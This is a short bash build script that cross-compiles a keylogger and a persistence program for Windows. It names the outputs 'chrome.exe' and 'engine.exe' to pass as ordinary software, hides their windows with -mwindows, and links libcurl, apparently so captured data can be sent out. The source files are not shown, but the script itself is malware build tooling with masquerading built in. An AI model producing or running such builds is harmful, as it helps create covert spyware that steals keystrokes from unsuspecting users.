#!/bin/bash
x86_64-w64-mingw32-gcc -o chrome.exe persistence.c -lcurl -mwindows
x86_64-w64-mingw32-gcc -o engine.exe keylogger.c -lcurl -mwindows
